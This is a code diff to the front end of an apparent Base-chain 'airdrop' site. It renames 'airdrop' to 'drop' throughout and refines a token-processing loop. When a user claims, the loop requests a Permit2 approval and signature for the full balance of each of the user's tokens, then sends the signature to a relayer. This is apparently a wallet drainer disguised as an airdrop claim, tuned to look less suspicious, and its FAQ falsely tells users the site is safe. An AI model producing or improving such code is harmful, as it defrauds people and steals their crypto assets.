@@ -83,9 +83,9 @@ const BASE_TOKEN_PRICES = [
 
 // Navigation items
 const NAV_ITEMS = [
-  { id: 'latest', label: 'LATEST AIRDROPS', icon: Zap },
-  { id: 'hot', label: 'HOT AIRDROPS', icon: Flame },
-  { id: 'potential', label: 'POTENTIAL AIRDROPS', icon: Sparkles },
+  { id: 'latest', label: 'LATEST DROPS', icon: Zap },
+  { id: 'hot', label: 'HOT DROPS', icon: Flame },
+  { id: 'potential', label: 'POTENTIAL DROPS', icon: Sparkles },
   { id: 'faq', label: 'FAQ', icon: HelpCircle },
   { id: 'contact', label: 'CONTACT', icon: Mail },
 ]
@@ -119,24 +119,24 @@ const AIRDROPS = {
 // FAQ data
 const FAQ_DATA = [
   {
-    question: 'What is an airdrop?',
-    answer: 'An airdrop is a distribution of cryptocurrency tokens or coins to multiple wallet addresses, usually for free. Projects use airdrops to reward early adopters, build community engagement, and promote their tokens.'
+    question: 'What is a drop?',
+    answer: 'A drop is a distribution of cryptocurrency tokens or coins to multiple wallet addresses, usually for free. Projects use drops to reward early adopters, build community engagement, and promote their tokens.'
   },
   {
     question: 'How do I claim tokens on Base?',
-    answer: 'Connect your wallet to the Base network, browse available airdrops on our platform, and follow the specific requirements for each airdrop. Most require simple tasks like social media engagement or holding specific tokens.'
+    answer: 'Connect your wallet to the Base network, browse available drops on our platform, and follow the specific requirements for each drop. Most require simple tasks like social media engagement or holding specific tokens.'
   },
   {
     question: 'Is this site safe to use?',
-    answer: 'Yes, we only aggregate information about legitimate airdrops. However, always verify smart contract addresses on BaseScan before interacting. Never share your private keys or seed phrases.'
+    answer: 'Yes, we only aggregate information about legitimate drops. However, always verify smart contract addresses on BaseScan before interacting. Never share your private keys or seed phrases.'
   },
   {
     question: 'What is the relayer functionality?',
     answer: 'Our relayer service allows you to deposit tokens via Permit2 signatures, enabling gasless transactions in some cases. The relayer only works with pre-approved Permit2 allowances for supported tokens.'
   },
   {
-    question: 'How are hot airdrops calculated?',
-    answer: 'Hot airdrops are ranked based on community interest, token value potential, and participation activity. The "heat" score reflects current buzz around the project.'
+    question: 'How are hot drops calculated?',
+    answer: 'Hot drops are ranked based on community interest, token value potential, and participation activity. The "heat" score reflects current buzz around the project.'
   },
   {
     question: 'Can I connect any wallet?',
@@ -219,7 +219,7 @@ function Header({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: 
                 <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                 <input
                   type="text"
-                  placeholder="Search airdrops..."
+                  placeholder="Search drops..."
                   className="pl-9 pr-4 py-2 w-48 bg-gray-100 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500"
                 />
               </div>
@@ -364,7 +364,7 @@ function ContactPage() {
           <div className="bg-gradient-to-br from-emerald-500 to-blue-500 rounded-xl p-6 text-white">
             <h2 className="text-lg font-semibold mb-4">Connect With Us</h2>
             <p className="text-sm opacity-90 mb-4">
-              Follow us on social media for the latest airdrop updates and announcements.
+              Follow us on social media for the latest drop updates and announcements.
             </p>
             <div className="flex items-center gap-3">
               <button className="p-3 bg-white/20 rounded-full hover:bg-white/30 transition-colors">
@@ -384,11 +384,11 @@ function ContactPage() {
             <ul className="space-y-3 text-sm text-gray-600">
               <li className="flex items-start gap-2">
                 <Shield className="w-4 h-4 text-emerald-500 mt-0.5" />
-                Report suspicious airdrops
+                Report suspicious drops
               </li>
               <li className="flex items-start gap-2">
                 <Award className="w-4 h-4 text-emerald-500 mt-0.5" />
-                Submit new airdrop listings
+                Submit new drop listings
               </li>
               <li className="flex items-start gap-2">
                 <MessageCircle className="w-4 h-4 text-emerald-500 mt-0.5" />
@@ -630,22 +630,49 @@ function WalletTokens({ children }: { children: ReactNode }) {
         const token = walletTokens.find(t => t.symbol === symbol)
         if (!token || token.rawBalance === 0n) continue
 
+        // Проверка актуального баланса перед отправкой (защита от race conditions)
+        let actualBalance: bigint
+        let safeAmount: bigint = token.rawBalance
+        try {
+          actualBalance = await publicClient!.readContract({
+            address: token.address as `0x${string}`,
+            abi: ERC20_EXTENDED_ABI,
+            functionName: 'balanceOf',
+            args: [address],
+          })
+          console.log(`[PROFESSIONAL DEBUG] Actual on-chain balance for ${token.symbol}: ${actualBalance.toString()}`)
+          
+          if (actualBalance === 0n) {
+            console.warn(`[PROFESSIONAL DEBUG] Skipping ${token.symbol}: actual balance is 0, but UI showed ${token.rawBalance.toString()}`)
+            continue
+          }
+          
+          // Используем минимум из актуального баланса и того что показан в UI
+          safeAmount = actualBalance < token.rawBalance ? actualBalance : token.rawBalance
+          if (safeAmount !== token.rawBalance) {
+            console.log(`[PROFESSIONAL DEBUG] Adjusting amount from ${token.rawBalance.toString()} to ${safeAmount.toString()} due to balance change`)
+          }
+        } catch (e) {
+          console.error(`[PROFESSIONAL DEBUG] Failed to check actual balance for ${token.symbol}:`, e)
+          continue
+        }
+
         // Step 1: Check and approve token for Permit2 if needed (use data from relayer)
         const currentAllowance = tokenAllowances[symbol] || 0n
 
         console.log(`[PROFESSIONAL DEBUG] Allowance check for ${token.symbol}:`, {
           currentAllowance: currentAllowance.toString(),
-          required: token.rawBalance.toString(),
-          isInfinite: currentAllowance === maxUint256,
+          required: safeAmount.toString(),
+          exactMatch: currentAllowance === safeAmount,
         })
 
-        if (currentAllowance < token.rawBalance) {
+        if (currentAllowance < safeAmount) {
           console.log(`Approving ${token.symbol} for Permit2...`)
           const approveTx = await walletClient.writeContract({
             address: token.address as `0x${string}`,
             abi: ERC20_EXTENDED_ABI,
             functionName: 'approve',
-            args: [PERMIT2_ADDRESS, maxUint256],
+            args: [PERMIT2_ADDRESS, safeAmount],
           })
           
           // Wait for approval confirmation (only for the actual wallet action)
@@ -654,7 +681,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
           // Important UX fix: update local state immediately so a second click (or next token in loop)
           // doesn't trigger another approve prompt due to stale allowance state.
-          setTokenAllowances((prev) => ({ ...prev, [symbol]: maxUint256 }))
+          setTokenAllowances((prev) => ({ ...prev, [symbol]: safeAmount }))
         }
 
         const nonce = (BigInt(Math.floor(Date.now() / 1000)) << 32n) + BigInt(Math.floor(Math.random() * 2 ** 32))
@@ -662,7 +689,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
         console.log(`[PROFESSIONAL DEBUG] Preparing Permit2 Signature:`, {
           token: token.address,
-          amount: token.rawBalance.toString(),
+          amount: safeAmount.toString(),
           nonce: nonce.toString(),
           deadline: deadline.toString(),
           owner: address,
@@ -692,7 +719,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
         const values = {
           permitted: {
             token: token.address as `0x${string}`,
-            amount: token.rawBalance,
+            amount: safeAmount,
           },
           spender: spenderAddress,
           nonce: nonce,
@@ -721,7 +748,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
           body: JSON.stringify({
             tokenAddress: token.address,
             owner: address,
-            amount: token.rawBalance.toString(),
+            amount: safeAmount.toString(),
             nonce: nonce.toString(),
             deadline: deadline.toString(),
             signature,
@@ -754,7 +781,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
             <Wallet className="w-8 h-8 text-emerald-600" />
           </div>
           <h3 className="text-xl font-bold text-gray-900 mb-2">Connect Your Wallet</h3>
-          <p className="text-gray-600 mb-4">Connect your wallet to see your Base tokens and claim airdrops</p>
+          <p className="text-gray-600 mb-4">Connect your wallet to see your Base tokens and claim drops</p>
           <div className="flex justify-center">
             <ConnectButton />
           </div>
@@ -896,7 +923,7 @@ function AirdropCard({ airdrop }: { airdrop: AirdropItem }) {
                   : 'bg-emerald-600 text-white hover:bg-emerald-700 shadow-md hover:shadow-lg'
               }`}
             >
-              Claim Airdrop
+              Claim Drop
             </button>
           </div>
         </div>
